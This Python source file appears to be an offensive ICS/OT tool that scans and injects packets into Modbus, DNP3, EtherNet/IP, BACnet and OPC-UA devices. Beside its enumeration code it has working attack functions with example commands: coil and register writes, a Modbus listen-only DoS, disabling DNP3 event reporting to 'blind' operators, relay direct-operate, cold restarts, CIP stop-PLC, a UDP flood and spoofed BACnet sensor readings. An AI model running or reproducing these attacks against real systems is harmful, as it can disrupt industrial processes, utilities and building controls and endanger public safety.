#!/usr/bin/env python3
"""
ICS/OT Protocol Probe - ClaudeCodeIPTool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Scanner and packet injector for industrial control system protocols.

Protocols (from O'Reilly Industrial Network Security 2nd+3rd Ed):
- Modbus/TCP: port 502  - PLCs, RTUs (no auth, no encryption)
- DNP3:       port 20000 - Utilities, substations (no auth in standard)
- EtherNet/IP: port 44818/tcp + 2222/udp - Rockwell, Omron
- BACnet/IP:  port 47808 - Building automation (HVAC, access)
- OPC-UA:     port 4840  - Modern ICS data exchange

Key attack surfaces (per Digital Bond Project Basecamp):
- Modbus: FC 05/06/0F/10 = direct process manipulation; FC 08 sub 4 = DoS
- DNP3: FC 0x18 = blind operator (disable unsolicited), FC 0x05 = direct operate
- EtherNet/IP: CIP Reset (0x05), Stop PLC (class 0x68) - no auth on CIP
- BACnet: Who-Is broadcast reveals all devices; COV spoof = sensor injection
- OPC-UA: Anonymous browse if SecurityMode=None

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import argparse
import socket
import struct
import sys
import time

# ─── Modbus/TCP ──────────────────────────────────────────────────────────────

MODBUS_PORT = 502

MODBUS_FUNCTION_CODES = {
    0x01: "Read Coils",
    0x02: "Read Discrete Inputs",
    0x03: "Read Holding Registers",
    0x04: "Read Input Registers",
    0x05: "Write Single Coil",
    0x06: "Write Single Register",
    0x08: "Diagnostics",
    0x0F: "Write Multiple Coils",
    0x10: "Write Multiple Registers",
    0x2B: "Read Device ID",
}


def _modbus_request(host: str, unit_id: int, pdu: bytes, txid: int = 1) -> bytes:
    """Send Modbus/TCP MBAP + PDU, return raw response."""
    # MBAP Header: transaction(2) + protocol(2) + length(2) + unit_id(1)
    length = 1 + len(pdu)  # unit_id + PDU
    mbap = struct.pack(">HHHB", txid, 0, length, unit_id)
    s = socket.socket()
    s.settimeout(5)
    s.connect((host, MODBUS_PORT))
    s.send(mbap + pdu)
    resp = s.recv(512)
    s.close()
    return resp


def modbus_enumerate(host: str, verbose: bool = False) -> dict:
    """
    Enumerate Modbus slave:
    - Read Device ID (FC 43) for device info
    - Read holding registers 0-9 for process values
    - Read coils 0-7 for digital output state
    """
    results = {"host": host, "port": MODBUS_PORT, "protocol": "Modbus/TCP"}

    print(f"[*] Modbus enum: {host}:{MODBUS_PORT}")

    # FC 0x2B - Read Device ID (MEI Type 0x0E)
    try:
        pdu = bytes([0x2B, 0x0E, 0x01, 0x00])
        resp = _modbus_request(host, 1, pdu)
        if len(resp) > 8 and resp[7] == 0x2B:
            results["device_id_raw"] = resp[8:].hex()
            # Parse objects: each is tag(1)+len(1)+data
            offset = 12
            objects = {}
            while offset + 2 < len(resp):
                tag = resp[offset]
                ln = resp[offset + 1]
                val = resp[offset + 2:offset + 2 + ln].decode(errors="replace")
                objects[f"0x{tag:02X}"] = val
                offset += 2 + ln
            results["device_id"] = objects
            print(f"[+] Device ID: {objects}")
    except Exception as e:
        if verbose:
            print(f"[-] Device ID failed: {e}")

    # FC 0x03 - Read Holding Registers 40001-40010
    try:
        pdu = struct.pack(">BHH", 0x03, 0, 10)
        resp = _modbus_request(host, 1, pdu)
        if len(resp) > 9 and resp[7] == 0x03:
            count = resp[8]
            regs = []
            for i in range(0, count, 2):
                regs.append(struct.unpack_from(">H", resp, 9 + i)[0])
            results["holding_registers_0_9"] = regs
            print(f"[+] Holding registers [40001-40010]: {regs}")
    except Exception as e:
        if verbose:
            print(f"[-] Register read failed: {e}")

    # FC 0x01 - Read Coils 0-7
    try:
        pdu = struct.pack(">BHH", 0x01, 0, 8)
        resp = _modbus_request(host, 1, pdu)
        if len(resp) > 9 and resp[7] == 0x01:
            raw = resp[9]
            coils = [(raw >> i) & 1 for i in range(8)]
            results["coils_0_7"] = coils
            print(f"[+] Coils [0-7]: {coils}")
    except Exception as e:
        if verbose:
            print(f"[-] Coil read failed: {e}")

    return results


def modbus_write_coil(host: str, unit_id: int, coil_addr: int, value: bool):
    """FC 0x05: Write single coil. value=True → 0xFF00, False → 0x0000."""
    val_bytes = b'\xFF\x00' if value else b'\x00\x00'
    pdu = bytes([0x05]) + struct.pack(">H", coil_addr) + val_bytes
    resp = _modbus_request(host, unit_id, pdu)
    if resp[7] == 0x05:
        print(f"[+] Coil {coil_addr} → {'ON' if value else 'OFF'} (unit {unit_id})")
    else:
        print(f"[-] Error response FC: 0x{resp[7]:02X}")
    return resp


def modbus_write_register(host: str, unit_id: int, reg_addr: int, value: int):
    """FC 0x06: Write single holding register."""
    pdu = bytes([0x06]) + struct.pack(">HH", reg_addr, value)
    resp = _modbus_request(host, unit_id, pdu)
    if resp[7] == 0x06:
        print(f"[+] Register {40001 + reg_addr} (addr {reg_addr}) → {value}")
    else:
        print(f"[-] Error response: 0x{resp[7]:02X}")
    return resp


def modbus_listen_only_dos(host: str, unit_id: int):
    """FC 0x08 sub-fn 0x0004: Force listen-only mode (DoS - stops all command response)."""
    pdu = bytes([0x08, 0x00, 0x04, 0x00, 0x00])
    try:
        resp = _modbus_request(host, unit_id, pdu)
        print(f"[+] FC 08 sub-4 sent to unit {unit_id} - slave may be in listen-only mode")
    except Exception:
        print(f"[+] FC 08 sub-4 sent (no response expected in listen-only mode)")


# ─── DNP3 ─────────────────────────────────────────────────────────────────────

DNP3_PORT = 20000


def _dnp3_crc(data: bytes) -> int:
    """DNP3 CRC-16 (poly 0xA6BC, bit-reversed, init 0xFFFF complement)."""
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return (~crc) & 0xFFFF


def _dnp3_build_frame(src: int, dst: int, app_fc: int,
                      obj_data: bytes = b'', unsolicited: bool = False) -> bytes:
    """Build DNP3/TCP frame with link + transport + application layers."""
    # Application layer
    app_ctrl = 0xC0  # FIR=1, FIN=1, CON=0, UNS=0, seq=0
    if unsolicited:
        app_ctrl |= 0x10
    app_layer = bytes([app_ctrl, app_fc]) + obj_data

    # Transport: FIR=1, FIN=1, seq=0
    transport = bytes([0xC0]) + app_layer

    # Data blocks with CRC (16 bytes + 2 byte CRC each)
    data_with_crc = b''
    for i in range(0, len(transport), 16):
        block = transport[i:i + 16]
        crc = _dnp3_crc(block)
        data_with_crc += block + struct.pack("<H", crc)

    # Link layer header
    length = 5 + len(transport)
    ctrl = 0x44  # DIR=0, PRM=1, FCB=0, FCV=0, FC=4 (unconfirmed user data)
    header = bytes([0x05, 0x64, length, ctrl])
    header += struct.pack("<HH", dst, src)
    header_crc = _dnp3_crc(header)
    header += struct.pack("<H", header_crc)

    return header + data_with_crc


def dnp3_enumerate(host: str, master_addr: int = 1,
                   outstation_addr: int = 2, verbose: bool = False) -> dict:
    """
    Enumerate DNP3 outstation:
    - FC 0x01 (Read) Class 0 data
    - FC 0x01 (Read) all classes for event log
    """
    results = {"host": host, "port": DNP3_PORT, "protocol": "DNP3"}
    print(f"[*] DNP3 enum: {host}:{DNP3_PORT} (master={master_addr}, outstation={outstation_addr})")

    # Read Class 0 data (all static data)
    # Object Group 60, Var 1 = Class 0, qualifier 0x06 (all)
    obj_class0 = bytes([0x3C, 0x01, 0x06])
    frame = _dnp3_build_frame(master_addr, outstation_addr, 0x01, obj_class0)

    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, DNP3_PORT))
        s.send(frame)
        resp = s.recv(1024)
        s.close()
        results["class0_response_len"] = len(resp)
        results["class0_response_hex"] = resp[:64].hex()
        print(f"[+] Class 0 response: {len(resp)} bytes")
        if verbose:
            print(f"    {resp[:64].hex()}")
    except Exception as e:
        print(f"[-] DNP3 Class 0 read failed: {e}")

    return results


def dnp3_disable_unsolicited(host: str, master_addr: int = 1, outstation_addr: int = 2):
    """
    FC 0x18: Disable Unsolicited Responses.
    Effect: Outstation stops sending event/alarm updates = operator blinded.
    """
    # Group 60 Var 2 (class 1), qualifier 0x06
    obj = bytes([0x3C, 0x02, 0x06])
    frame = _dnp3_build_frame(master_addr, outstation_addr, 0x18, obj)
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, DNP3_PORT))
        s.send(frame)
        resp = s.recv(256)
        s.close()
        print(f"[+] FC 0x18 (Disable Unsolicited) sent to {host}:{outstation_addr}")
        print(f"    Operator now BLIND to events from this outstation")
    except Exception as e:
        print(f"[-] Failed: {e}")


def dnp3_direct_operate(host: str, master_addr: int = 1, outstation_addr: int = 2,
                        point_index: int = 0, value: bool = True):
    """
    FC 0x05: Direct Operate CROB (Control Relay Output Block).
    Triggers binary output - relay open/close, valve actuate.
    value=True = LATCH_ON (0x03), False = LATCH_OFF (0x04)
    """
    crob_code = 0x03 if value else 0x04
    # Group 12 Var 1, qualifier 0x28 (1-byte index prefix, count=1)
    obj_header = bytes([0x0C, 0x01, 0x28, 0x01, 0x00, point_index])
    # CROB: code, count, on_ms (1000ms), off_ms (0ms), status
    crob = bytes([crob_code, 0x01]) + struct.pack("<II", 1000, 0) + bytes([0x00])
    frame = _dnp3_build_frame(master_addr, outstation_addr, 0x05, obj_header + crob)
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, DNP3_PORT))
        s.send(frame)
        resp = s.recv(256)
        s.close()
        action = "LATCH_ON" if value else "LATCH_OFF"
        print(f"[+] FC 0x05 Direct Operate: point {point_index} → {action}")
    except Exception as e:
        print(f"[-] Failed: {e}")


def dnp3_cold_restart(host: str, master_addr: int = 1, outstation_addr: int = 2):
    """FC 0x12: Cold restart outstation (DoS)."""
    frame = _dnp3_build_frame(master_addr, outstation_addr, 0x12)
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, DNP3_PORT))
        s.send(frame)
        print(f"[+] FC 0x12 Cold Restart sent to outstation {outstation_addr}")
    except Exception as e:
        print(f"[-] {e}")


# ─── EtherNet/IP (CIP) ───────────────────────────────────────────────────────

EIP_PORT_TCP = 44818
EIP_PORT_UDP = 2222


class EIPSession:
    """EtherNet/IP explicit messaging session over TCP."""

    def __init__(self, host: str):
        self.host = host
        self.session_handle = 0
        self.sock = None

    def _enip_pkt(self, cmd: int, data: bytes, session: int = None) -> bytes:
        sh = session if session is not None else self.session_handle
        hdr = struct.pack("<HH", cmd, len(data))
        hdr += struct.pack("<I", sh)
        hdr += b'\x00' * 4   # status
        hdr += b'\x43\x4C\x49\x50\x00\x00\x00\x00'  # sender context "CLIP"
        hdr += b'\x00' * 4   # options
        return hdr + data

    def connect(self) -> bool:
        try:
            self.sock = socket.socket()
            self.sock.settimeout(5)
            self.sock.connect((self.host, EIP_PORT_TCP))
            return True
        except Exception as e:
            print(f"[-] EIP connect failed: {e}")
            return False

    def register_session(self) -> int:
        data = struct.pack("<HH", 1, 0)
        self.sock.send(self._enip_pkt(0x0065, data, session=0))
        resp = self.sock.recv(256)
        if len(resp) >= 8:
            self.session_handle = struct.unpack_from("<I", resp, 4)[0]
            return self.session_handle
        return 0

    def list_identity(self) -> bytes:
        """List Identity (no session needed) - device fingerprinting."""
        self.sock.send(self._enip_pkt(0x0064, b'', session=0))
        return self.sock.recv(1024)

    def _send_rr(self, cip_request: bytes) -> bytes:
        """Wrap CIP request in Send RR Data (connected message)."""
        data = struct.pack("<IH", 0, 10)  # interface handle, timeout
        data += struct.pack("<H", 2)       # item count
        data += struct.pack("<HH", 0x0000, 0)  # null address item
        data += struct.pack("<HH", 0x00B2, len(cip_request))  # unconnected data item
        data += cip_request
        self.sock.send(self._enip_pkt(0x006F, data))
        return self.sock.recv(1024)

    def get_identity(self) -> bytes:
        """CIP Get Attribute All (0x01) on Identity Object (class 1)."""
        cip = bytes([0x01, 0x02, 0x20, 0x01, 0x24, 0x01])
        return self._send_rr(cip)

    def reset_device(self) -> bytes:
        """CIP Reset (0x05) on Identity Object - cold restart."""
        cip = bytes([0x05, 0x02, 0x20, 0x01, 0x24, 0x01])
        return self._send_rr(cip)

    def stop_plc(self) -> bytes:
        """CIP Reset on Program Object (class 0x68) - force major fault / stop PLC."""
        cip = bytes([0x05, 0x02, 0x20, 0x68, 0x24, 0x01])
        return self._send_rr(cip)

    def close(self):
        if self.sock:
            self.sock.close()


def eip_enumerate(host: str, verbose: bool = False) -> dict:
    """Enumerate EtherNet/IP device: list identity + CIP identity attributes."""
    results = {"host": host, "port": EIP_PORT_TCP, "protocol": "EtherNet/IP CIP"}
    print(f"[*] EtherNet/IP enum: {host}:{EIP_PORT_TCP}")

    sess = EIPSession(host)
    if not sess.connect():
        return results

    try:
        # List Identity (no session)
        li_resp = sess.list_identity()
        if li_resp:
            results["list_identity_raw"] = li_resp.hex()
            print(f"[+] List Identity response: {len(li_resp)} bytes")

        # Register session + Get Attribute All
        if sess.register_session():
            print(f"[+] Session handle: 0x{sess.session_handle:08X}")
            id_resp = sess.get_identity()
            if id_resp and len(id_resp) > 28:
                # Identity object: vendor(2), device_type(2), product_code(2), revision(2), status(2), serial(4), name(...)
                offset = 44  # past EIP + CIP headers
                try:
                    vendor = struct.unpack_from("<H", id_resp, offset)[0]
                    dev_type = struct.unpack_from("<H", id_resp, offset + 2)[0]
                    prod_code = struct.unpack_from("<H", id_resp, offset + 4)[0]
                    major_rev = id_resp[offset + 6]
                    minor_rev = id_resp[offset + 7]
                    serial = struct.unpack_from("<I", id_resp, offset + 10)[0]
                    name_len = id_resp[offset + 14]
                    name = id_resp[offset + 15:offset + 15 + name_len].decode(errors="replace")
                    results["identity"] = {
                        "vendor_id": vendor,
                        "device_type": dev_type,
                        "product_code": prod_code,
                        "revision": f"{major_rev}.{minor_rev}",
                        "serial": f"0x{serial:08X}",
                        "product_name": name
                    }
                    print(f"[+] Identity: {name} (vendor={vendor}, type={dev_type}, rev={major_rev}.{minor_rev})")
                except Exception:
                    pass
    finally:
        sess.close()

    return results


def eip_udp_flood(host: str, count: int = 500):
    """Flood EIP implicit messaging port (2222/udp) - disrupts real-time I/O."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'\x00' * 28  # malformed implicit data
    print(f"[*] EIP UDP flood: {count} packets → {host}:{EIP_PORT_UDP}")
    for _ in range(count):
        s.sendto(payload, (host, EIP_PORT_UDP))
    s.close()
    print(f"[+] Sent {count} packets")


# ─── BACnet/IP ────────────────────────────────────────────────────────────────

BACNET_PORT = 47808  # 0xBAC0


def bacnet_who_is(broadcast: str = "255.255.255.255", timeout: int = 3) -> list:
    """
    BACnet Who-Is broadcast: enumerate all BACnet devices.
    Returns list of (addr, raw_response).
    """
    # BVLL: type=0x81, func=0x0B (broadcast), length=12
    # NPDU: version=1, control=0x20 (expect reply)
    # APDU: 0x10 (unconfirmed), service=0x08 (Who-Is)
    pkt = b'\x81\x0B\x00\x0C'  # BVLL broadcast
    pkt += b'\x01\x20'          # NPDU
    pkt += b'\x10\x08'          # APDU Who-Is

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.settimeout(timeout)
    s.sendto(pkt, (broadcast, BACNET_PORT))

    print(f"[*] BACnet Who-Is → {broadcast}:{BACNET_PORT}")
    devices = []
    try:
        while True:
            data, addr = s.recvfrom(1024)
            devices.append((addr, data))
            # Parse I-Am response (service 0x00)
            if len(data) > 9 and data[9] == 0x00:
                print(f"[+] I-Am from {addr[0]}:{addr[1]}")
    except socket.timeout:
        pass
    finally:
        s.close()

    print(f"[+] Found {len(devices)} BACnet devices")
    return devices


def bacnet_spoof_cov(target_ip: str, device_id: int, object_type: int,
                     object_instance: int, float_value: float):
    """
    Spoof BACnet Unconfirmed-COV-Notification (service 0x02).
    Injects false sensor reading to BMS controller.
    Example: object_type=0 (AI), float_value=99.9 (fake temperature)
    """
    bvll = b'\x81\x0A'  # BACnet/IP unicast

    npdu = b'\x01\x00'  # version, no reply expected

    # APDU: Unconfirmed (0x10) COV-Notification (0x02)
    apdu = b'\x10\x02'

    # Context 0: subscriber process identifier (1)
    apdu += b'\x09\x01'

    # Context 3: initiating device ID (tag 0x1C)
    obj_id = (8 << 22) | (device_id & 0x3FFFFF)
    apdu += b'\x1C' + struct.pack(">I", obj_id)

    # Context 5: monitored object ID (tag 0x2C)
    mon_obj = (object_type << 22) | (object_instance & 0x3FFFFF)
    apdu += b'\x2C' + struct.pack(">I", mon_obj)

    # Context 7: time remaining (0)
    apdu += b'\x39\x00'

    # Context 9 (list of values): present-value property
    apdu += b'\x4E'                   # opening tag 9
    apdu += b'\x09\x55'               # property identifier: present-value (85)
    apdu += b'\x2E'                   # opening tag 5
    apdu += b'\x44' + struct.pack(">f", float_value)  # real value
    apdu += b'\x2F'                   # closing tag 5
    apdu += b'\x4F'                   # closing tag 9

    payload = npdu + apdu
    bvll += struct.pack(">H", 4 + len(payload)) + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(bvll, (target_ip, BACNET_PORT))
    s.close()
    print(f"[+] BACnet COV spoofed: device {device_id}, obj ({object_type},{object_instance}) → {float_value}")
    print(f"    Impact: BMS controller receives false sensor reading")


# ─── OPC-UA ──────────────────────────────────────────────────────────────────

OPCUA_PORT = 4840


def opcua_hello(host: str) -> bytes:
    """
    OPC-UA Hello - probe open port and get server ACK/error.
    No auth needed. Confirms service and gets server buffer size.
    """
    endpoint = f"opc.tcp://{host}:{OPCUA_PORT}".encode()
    hello = b'HEL'
    hello += b'F'  # final chunk
    hello += b'\x00' * 4  # size placeholder
    hello += struct.pack("<I", 0)       # protocol version
    hello += struct.pack("<I", 65536)   # receive buffer
    hello += struct.pack("<I", 65536)   # send buffer
    hello += struct.pack("<I", 0)       # max message size (0=unlimited)
    hello += struct.pack("<I", 0)       # max chunk count
    hello += struct.pack("<I", len(endpoint)) + endpoint

    # Patch size
    size = len(hello)
    hello = hello[:4] + struct.pack("<I", size) + hello[8:]

    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, OPCUA_PORT))
        s.send(hello)
        resp = s.recv(1024)
        s.close()

        msg_type = resp[:3].decode(errors="replace") if len(resp) >= 4 else "?"
        print(f"[+] OPC-UA Hello → {msg_type} ({len(resp)} bytes)")
        if msg_type == "ACK":
            srv_recv = struct.unpack_from("<I", resp, 12)[0]
            srv_send = struct.unpack_from("<I", resp, 16)[0]
            print(f"    Server buffers: recv={srv_recv}, send={srv_send}")
        elif msg_type == "ERR":
            err_code = struct.unpack_from("<I", resp, 8)[0]
            print(f"    Error code: 0x{err_code:08X}")
        return resp
    except Exception as e:
        print(f"[-] OPC-UA Hello failed: {e}")
        return b''


def opcua_enumerate(host: str):
    """Attempt OPC-UA anonymous browse (requires opcua library)."""
    try:
        from opcua import Client

        url = f"opc.tcp://{host}:{OPCUA_PORT}"
        client = Client(url)
        client.connect()
        objects = client.get_objects_node()

        def browse(node, depth=0, max_depth=2):
            if depth > max_depth:
                return
            try:
                for child in node.get_children():
                    name = child.get_browse_name()
                    try:
                        val = child.get_value()
                        print(f"    {'  ' * depth}{name} = {val}")
                    except Exception:
                        print(f"    {'  ' * depth}{name}")
                    browse(child, depth + 1, max_depth)
            except Exception:
                pass

        print(f"[+] OPC-UA anonymous browse (SecurityMode=None confirmed):")
        browse(objects)
        client.disconnect()

    except ImportError:
        print("[!] opcua library not installed: pip install opcua")
        print("[*] Falling back to Hello probe only")
        opcua_hello(host)
    except Exception as e:
        print(f"[-] OPC-UA browse failed (may require auth): {e}")


# ─── Multi-Protocol Scanner ───────────────────────────────────────────────────

def scan_host(host: str, verbose: bool = False) -> dict:
    """
    Probe a single host for all 5 ICS protocols.
    Returns dict of open protocols with fingerprint data.
    """
    open_protocols = {}
    checks = [
        ("Modbus/TCP", MODBUS_PORT, socket.SOCK_STREAM),
        ("DNP3", DNP3_PORT, socket.SOCK_STREAM),
        ("EtherNet/IP", EIP_PORT_TCP, socket.SOCK_STREAM),
        ("BACnet/IP", BACNET_PORT, socket.SOCK_DGRAM),
        ("OPC-UA", OPCUA_PORT, socket.SOCK_STREAM),
    ]

    print(f"\n[*] Scanning {host} for ICS protocols...")
    for proto, port, sock_type in checks:
        try:
            if sock_type == socket.SOCK_STREAM:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((host, port))
                s.close()
                if result == 0:
                    print(f"[+] {proto:18s} port {port}/tcp OPEN")
                    open_protocols[proto] = port
            else:
                # UDP: send a small probe and check for ICMP port-unreach absence
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1)
                s.sendto(b'\x81\x0B\x00\x0C\x01\x20\x10\x08', (host, port))
                try:
                    s.recv(64)
                    print(f"[+] {proto:18s} port {port}/udp OPEN (responded)")
                    open_protocols[proto] = port
                except socket.timeout:
                    print(f"[~] {proto:18s} port {port}/udp (no response - may be open)")
                s.close()
        except Exception:
            pass

    return open_protocols


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="ICS/OT Protocol Probe - Modbus/DNP3/EtherNet-IP/BACnet/OPC-UA",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  scan        - Probe host for all 5 ICS protocols (port check + fingerprint)
  modbus      - Modbus/TCP enumeration + optional write/DoS
  dnp3        - DNP3 enumeration + disable-unsolicited / direct-operate
  enip        - EtherNet/IP (CIP) enumeration + optional reset/stop
  bacnet      - BACnet Who-Is broadcast scan
  opcua       - OPC-UA Hello + anonymous browse attempt

Examples:
  # Multi-protocol scan
  python3 ics-probe.py scan 192.168.1.100 -v

  # Modbus: enumerate registers and coils
  python3 ics-probe.py modbus 192.168.1.100 enum

  # Modbus: flip coil 0 ON (unit ID 1)
  python3 ics-probe.py modbus 192.168.1.100 write-coil --unit 1 --addr 0 --value on

  # Modbus: DoS via listen-only mode
  python3 ics-probe.py modbus 192.168.1.100 dos --unit 255

  # DNP3: enumerate class 0 data
  python3 ics-probe.py dnp3 192.168.1.100 enum --master 1 --outstation 2

  # DNP3: blind operator (disable unsolicited)
  python3 ics-probe.py dnp3 192.168.1.100 disable-unsolicited

  # DNP3: direct operate (relay LATCH_ON)
  python3 ics-probe.py dnp3 192.168.1.100 operate --point 0 --value on

  # DNP3: remote cold restart
  python3 ics-probe.py dnp3 192.168.1.100 restart

  # EtherNet/IP: enumerate device identity
  python3 ics-probe.py enip 192.168.1.100 enum

  # EtherNet/IP: CIP Reset (cold restart)
  python3 ics-probe.py enip 192.168.1.100 reset

  # EtherNet/IP: Stop PLC (major fault)
  python3 ics-probe.py enip 192.168.1.100 stop

  # BACnet: Who-Is broadcast
  python3 ics-probe.py bacnet 192.168.1.255 scan

  # BACnet: inject false temperature reading (AI object 0, value 150.0°F)
  python3 ics-probe.py bacnet 192.168.1.100 spoof-cov --device 1234 --type 0 --instance 0 --value 150.0

  # OPC-UA: Hello probe + anonymous browse
  python3 ics-probe.py opcua 192.168.1.100

CONTROLLED ENVIRONMENT ONLY
        """
    )

    parser.add_argument("mode", choices=["scan", "modbus", "dnp3", "enip", "bacnet", "opcua"])
    parser.add_argument("host", help="Target host IP")
    parser.add_argument("action", nargs="?", default="enum",
                        help="Protocol action (enum, write-coil, write-reg, dos, disable-unsolicited, operate, restart, reset, stop, scan, spoof-cov)")
    parser.add_argument("--unit", type=int, default=1, help="Modbus unit ID")
    parser.add_argument("--addr", type=int, default=0, help="Register/coil address")
    parser.add_argument("--value", help="Value to write (on/off or integer)")
    parser.add_argument("--master", type=int, default=1, help="DNP3 master address")
    parser.add_argument("--outstation", type=int, default=2, help="DNP3 outstation address")
    parser.add_argument("--point", type=int, default=0, help="DNP3 point index for operate")
    parser.add_argument("--device", type=int, default=1, help="BACnet device instance")
    parser.add_argument("--type", type=int, default=0, dest="obj_type", help="BACnet object type")
    parser.add_argument("--instance", type=int, default=0, help="BACnet object instance")
    parser.add_argument("--count", type=int, default=500, help="EIP UDP flood count")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    if args.mode == "scan":
        open_protocols = scan_host(args.host, args.verbose)
        if open_protocols:
            print(f"\n[+] Detected {len(open_protocols)} ICS protocol(s): {', '.join(open_protocols.keys())}")
        else:
            print("[~] No ICS protocols detected (may be filtered)")

    elif args.mode == "modbus":
        if args.action == "enum":
            modbus_enumerate(args.host, args.verbose)
        elif args.action == "write-coil":
            val = args.value.lower() in ("on", "1", "true", "yes") if args.value else True
            modbus_write_coil(args.host, args.unit, args.addr, val)
        elif args.action == "write-reg":
            val = int(args.value) if args.value else 0
            modbus_write_register(args.host, args.unit, args.addr, val)
        elif args.action == "dos":
            modbus_listen_only_dos(args.host, args.unit)
        else:
            print(f"Unknown action: {args.action}")

    elif args.mode == "dnp3":
        if args.action == "enum":
            dnp3_enumerate(args.host, args.master, args.outstation, args.verbose)
        elif args.action == "disable-unsolicited":
            dnp3_disable_unsolicited(args.host, args.master, args.outstation)
        elif args.action == "operate":
            val = args.value.lower() in ("on", "1", "true", "yes") if args.value else True
            dnp3_direct_operate(args.host, args.master, args.outstation, args.point, val)
        elif args.action == "restart":
            dnp3_cold_restart(args.host, args.master, args.outstation)
        else:
            print(f"Unknown action: {args.action}")

    elif args.mode == "enip":
        if args.action == "enum":
            eip_enumerate(args.host, args.verbose)
        elif args.action == "reset":
            sess = EIPSession(args.host)
            if sess.connect() and sess.register_session():
                sess.reset_device()
                print("[+] CIP Reset sent (cold restart)")
                sess.close()
        elif args.action == "stop":
            sess = EIPSession(args.host)
            if sess.connect() and sess.register_session():
                sess.stop_plc()
                print("[+] CIP Stop PLC sent (major fault)")
                sess.close()
        elif args.action == "flood":
            eip_udp_flood(args.host, args.count)
        else:
            print(f"Unknown action: {args.action}")

    elif args.mode == "bacnet":
        if args.action == "scan":
            bacnet_who_is(args.host)
        elif args.action == "spoof-cov":
            float_val = float(args.value) if args.value else 100.0
            bacnet_spoof_cov(args.host, args.device, args.obj_type, args.instance, float_val)
        else:
            bacnet_who_is(args.host)

    elif args.mode == "opcua":
        opcua_enumerate(args.host)


if __name__ == "__main__":
    main()
